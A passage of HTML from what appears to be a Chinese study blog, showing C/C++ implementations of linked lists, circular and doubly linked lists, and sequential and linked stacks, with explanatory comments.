class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//指针变量p：表示结点地址  node *p（变量声明）</span><br><span class="hljs-comment">//结点变量*p：表示一个结点</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span>&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;LNode, *linklist;   <span class="hljs-comment">//*LinkList 为node类型的指针</span><br><br><br><span class="hljs-comment">//初始化，构造一个空表①</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">createlist</span><span class="hljs-params">(linklist &amp;<span class="hljs-built_in">list</span>)</span> &#123;<br><span class="hljs-built_in">list</span> = new LNode;<br><span class="hljs-built_in">list</span>-&gt;next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//②C语言</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitList_L</span><span class="hljs-params">(linklist *L)</span><br>&#123;<br>*L = (linklist)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LNode));<br>(*L)-&gt;next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//单链表的建立 前插法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">hcreatelist</span><span class="hljs-params">(linklist &amp;L, <span class="hljs-type">int</span> n)</span> &#123;<br>L = new LNode;<br>L-&gt;next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//先建立一个带头结点的单链表</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=n; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>linklist p = new LNode;<span class="hljs-comment">//生成新结点</span><br>p-&gt;data = i;<span class="hljs-comment">//输入元素值</span><br>p-&gt;next = L-&gt;next;<br>L-&gt;next = p;<span class="hljs-comment">//插入到表头</span><br><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//单链表的建立，尾插法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">lcreatelist</span><span class="hljs-params">(linklist &amp;L, <span class="hljs-type">int</span> n)</span> &#123;<br><span class="hljs-comment">//正位序输入n个元素的值，建立带表头结点的单链表L</span><br>L = new LNode;<br>L-&gt;next = <span class="hljs-literal">NULL</span>;<br>linklist r = L; <span class="hljs-comment">//尾指针r指向头结点</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>linklist p = new LNode;<span class="hljs-comment">//生成新结点</span><br>p-&gt;data = i;<span class="hljs-comment">//输入元素值</span><br>p-&gt;next = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//插入到表尾</span><br>r-&gt;next = p;<span class="hljs-comment">//r指向新的尾结点</span><br>r = p;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//销毁</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">destroylist</span><span class="hljs-params">(linklist &amp;L)</span> &#123;<br>linklist p;<br><span class="hljs-keyword">while</span> (L) &#123;<br>p = L;<br>L = L-&gt;next;<br>delete p;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//清空（带头结点）</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">clearlist</span><span class="hljs-params">(linklist &amp;L)</span> &#123;<br><span class="hljs-comment">//将L重置为空表</span><br>linklist p, q;<br>p = L-&gt;next;<span class="hljs-comment">//p指向第一个结点</span><br><span class="hljs-keyword">while</span> (p) &#123;<span class="hljs-comment">//没到表尾</span><br>q = p-&gt;next;<br>delete p;<br>p = q;<br>&#125;<br>L-&gt;next = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//头结点指针域为空</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//求表长</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listlength</span><span class="hljs-params">(linklist L)</span> &#123;<br><span class="hljs-comment">//返回L中数据元素个数</span><br>linklist p;<br>p = L-&gt;next;<span class="hljs-comment">//p指向第一个结点</span><br><span class="hljs-type">int</span> i;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (p) &#123;<span class="hljs-comment">//遍历单链表，统计结点数</span><br>i++;<br>p = p-&gt;next;<br>&#125;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-comment">//判断表是否为空</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listempty</span><span class="hljs-params">(linklist L)</span> &#123;<br><span class="hljs-comment">//若L为空表，则返回1，否则返回0</span><br><span class="hljs-keyword">if</span> (L-&gt;next) &#123; <span class="hljs-comment">//非空</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//获取某个位置的元素内容</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getelem</span><span class="hljs-params">(linklist L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> &amp;e)</span> &#123;<br>linklist p = L-&gt;next;<span class="hljs-comment">//初始化</span><br><span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (p&amp;&amp;j &lt; i) &#123;<span class="hljs-comment">//向后扫描，直到p指向第i个元素或p为空</span><br>p = p-&gt;next;<br>++j;<br>&#125;<br><span class="hljs-keyword">if</span> (!p || j &gt; i) &#123;<span class="hljs-comment">//第i个元素不存在</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>e = p-&gt;data;<span class="hljs-comment">//获取第i个元素</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>&#125;<br><br><span class="hljs-comment">//查找值为e的数据元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">location</span><span class="hljs-params">(linklist L, <span class="hljs-type">int</span> e)</span> &#123;<br><span class="hljs-comment">//返回L（带头结点）中值为e的数据元素的位置序号，查找失败返回0</span><br>linklist p = L-&gt;next;<br><span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (p&amp;&amp;p-&gt;data != e) &#123;<br>p = p-&gt;next;<br>j++;<br><br>&#125;<br><span class="hljs-keyword">if</span> (p) &#123;<br><span class="hljs-keyword">return</span> j;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//在第i个元素之前插入数据元素e</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listinsert</span><span class="hljs-params">(linklist &amp;L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> e)</span> &#123;<br>linklist p = L;<br><span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (p&amp;&amp;j &lt; i - <span class="hljs-number">1</span>) &#123;<br>p = p-&gt;next;<br>++j;  <span class="hljs-comment">//寻找第i-1个结点</span><br>&#125;<br><span class="hljs-keyword">if</span> (!p || j&gt; i - <span class="hljs-number">1</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>linklist s = new LNode;<span class="hljs-comment">//生成新结点</span><br>s-&gt;data = e;<span class="hljs-comment">//将结点s的数据域设置为e</span><br>s-&gt;next = p-&gt;next;<span class="hljs-comment">//将结点s插入L中</span><br>p-&gt;next = s;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//删除线性表中的第i个数据元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listdelete</span><span class="hljs-params">(linklist &amp;L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> &amp;e)</span> &#123;<br>linklist p = L;<br><span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (p-&gt;next&amp;&amp;j&lt; i - <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//寻找第i个结点，并令p指向其前驱</span><br>p = p-&gt;next;<br>++j;<br>&#125;<br><span class="hljs-keyword">if</span> (!(p-&gt;next) || j &gt; i - <span class="hljs-number">1</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//删除位置不合理</span><br>linklist q;<br>q = p-&gt;next;<span class="hljs-comment">//临时保存被删结点的地址以备释放</span><br>p-&gt;next = q-&gt;next;  <span class="hljs-comment">//改变删除结点前驱结点的指针域</span><br>e = q-&gt;data;  <span class="hljs-comment">//保存删除结点的数据域</span><br>delete q;   <span class="hljs-comment">//释放删除结点的空间</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>linklist <span class="hljs-built_in">list</span>;<br>createlist(<span class="hljs-built_in">list</span>);<br>srand((<span class="hljs-type">unsigned</span>)time(<span class="hljs-literal">NULL</span>));<br><br>&#125;<br></code></pre></td></tr></table></figure><h1>循环链表</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//循环链表中没有明显的尾端，如何避免死循环：P!=L   p-&gt;next!=L</span><br><span class="hljs-comment">//尾端结点：rear</span><br><span class="hljs-comment">//首元结点：rear-&gt;next-&gt;next</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> &#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;LNode, *linklist;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">createlist</span><span class="hljs-params">(linklist &amp;L)</span> &#123;<br>L = new LNode;<br>L-&gt;next = L;<span class="hljs-comment">//空表</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//循环链表的合并</span><br><span class="hljs-comment">//假设A、B都是非空循环链表</span><br>linklist <span class="hljs-title function_">Connect</span><span class="hljs-params">(linklist Ta, linklist Tb)</span> &#123;<br>linklist p;<br>p = Ta-&gt;next;<span class="hljs-comment">//p存表头结点</span><br>Ta-&gt;next = Tb-&gt;next-&gt;next;<span class="hljs-comment">//Tb表头连接Ta表尾</span><br>delete Tb-&gt;next;<span class="hljs-comment">//释放Tb表头结点</span><br>Tb-&gt;next = p;<span class="hljs-comment">//修改指针</span><br><span class="hljs-keyword">return</span> Tb;<br>&#125;<br><br><span class="hljs-comment">//双向链表</span><br><span class="hljs-comment">//d-&gt;next-&gt;prior=d-&gt;prior-&gt;next=d</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DuLNode</span> &#123;</span><br><span class="hljs-type">int</span> date;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DuLNode</span> *<span class="hljs-title">prior</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DuLNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;DuLNode,*DuLinkList;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">careateDulist</span><span class="hljs-params">(DuLinkList &amp;L)</span> &#123;<br>L = new DuLNode;<br>L-&gt;next = L;<span class="hljs-comment">//双向空循环链表</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//双向循环链表的插入</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ListInsert_DuL</span><span class="hljs-params">(DuLinkList &amp;L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> e)</span> &#123;<br>DuLinkList p;<br><span class="hljs-keyword">if</span>(!(p=GetElemP_DuL(L,i)))<span class="hljs-keyword">return</span> ERROR;<br>DuLinkList s = new DuLNode;<br>s-&gt;date = e;<br>s-&gt;prior = p-&gt;prior;<br>p-&gt;prior-&gt;next = s;<br>s-&gt;next = p;<br>p-&gt;prior = s;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//双向循环链表的删除</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ListDelete_DuL</span><span class="hljs-params">(DuLinkList &amp;L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> e)</span> &#123;<br>DuLinkList p;<br><span class="hljs-keyword">if</span> (!(p = GetElemP_DuL(L, i)))<span class="hljs-keyword">return</span> ERROR;<br>e = p-&gt;date;<br>p-&gt;prior-&gt;next = p-&gt;next;<br>p-&gt;next-&gt;prior = p-&gt;prior;<br>delete p;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h1>栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//顺序栈</span><br><span class="hljs-comment">//顺序栈的表示</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> *base;<br><span class="hljs-type">int</span> *top;<br><span class="hljs-type">int</span> stacksize;<br>&#125;SqStack;<br><br><span class="hljs-comment">//顺序栈初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitStack</span><span class="hljs-params">(SqStack &amp;S)</span><br>&#123;<br>S.base = new <span class="hljs-type">int</span>[MAXSIZE];    <span class="hljs-comment">//分配空间并检查空间是否分配失败</span><br><span class="hljs-keyword">if</span> (!S.base)<span class="hljs-keyword">return</span> OVERFLOW;  <span class="hljs-comment">//分配失败返回错误</span><br>S.top = S.base;      <span class="hljs-comment">//空栈,注意不是S.base=S.top</span><br>S.stacksize = MAXSIZE;<span class="hljs-comment">//设置栈的大小</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//判断顺序栈是否为空</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(SqStack S)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S.top == S.base)<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//求顺序栈的长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">StackLength</span><span class="hljs-params">(SqStack S)</span><br>&#123;<br><span class="hljs-keyword">return</span> S.top - S.base;<br>&#125;<br><br><span class="hljs-comment">//清空顺序栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ClearStack</span><span class="hljs-params">(SqStack &amp;S)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S.base)S.top = S.base;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//销毁顺序栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">DestryStack</span><span class="hljs-params">(SqStack &amp;S)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S.base)<br>&#123;<br>delete S.base;<br>S.stacksize = <span class="hljs-number">0</span>;<br>S.base = S.top = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//顺序栈进栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack &amp;S, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S.top - S.base &gt;= S.stacksize)<span class="hljs-comment">//栈满</span><br>&#123;<br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br>*S.top++ = e;   <span class="hljs-comment">//元素e压入栈顶，栈顶指针+1</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//顺序栈出栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack &amp;S, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S.base == S.top) &#123;<span class="hljs-comment">//判断是否栈空</span><br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br>e = *--S.top;<span class="hljs-comment">//栈顶指针减一，获取栈顶元素</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//取顺序栈栈顶元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetTop</span><span class="hljs-params">(SqStack S, <span class="hljs-type">int</span> &amp;e)</span> &#123;<br><span class="hljs-keyword">if</span> (S.top == S.base)<span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">//栈空</span><br>e = *(S.top<span class="hljs-number">-1</span>);<span class="hljs-comment">//注意写法，非S.top--</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">/////////////////////////</span><br><span class="hljs-comment">//链栈</span><br><span class="hljs-comment">//栈顶指针就是链表的头指针</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span> &#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StackNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;StackNode,*LinkStack;<br><br><span class="hljs-comment">//链栈的初始化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitStack2</span><span class="hljs-params">(LinkStack &amp;S)</span> &#123;<br>S = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//判断链栈是否为空</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">StackEmpty2</span><span class="hljs-params">(LinkStack S)</span> &#123;<br><span class="hljs-keyword">if</span> (S == <span class="hljs-literal">NULL</span>)<span class="hljs-keyword">return</span> OK;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br><span class="hljs-comment">//链栈进栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Push2</span><span class="hljs-params">(LinkStack &amp;S, <span class="hljs-type">int</span> e)</span><br>&#123;<br>LinkStack p;<br>p = new StackNode;<br><span class="hljs-keyword">if</span> (!p)<span class="hljs-built_in">exit</span>(OVERFLOW);<br>p-&gt;data = e;<br>p-&gt;next = S;<br>S = p;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//链栈出栈</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Pop2</span><span class="hljs-params">(LinkStack &amp;S, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br>LinkStack p;<br><span class="hljs-keyword">if</span> (S == <span class="hljs-literal">NULL</span>)<span class="hljs-keyword">return</span> ERROR;<br>e = S-&gt;data;<br>p = S;<br>S = S-&gt;next;<br>delete p;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//取链栈栈顶元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetTop2</span><span class="hljs-params">(LinkStack S)</span><br>&#123;<br><span class="hljs-keyword">if</span> (S == <span class="hljs-literal">NULL</span>)<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> S-&gt;data;<br>&#125;<br></code></pre></td></tr></table></figure><h1>队列</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 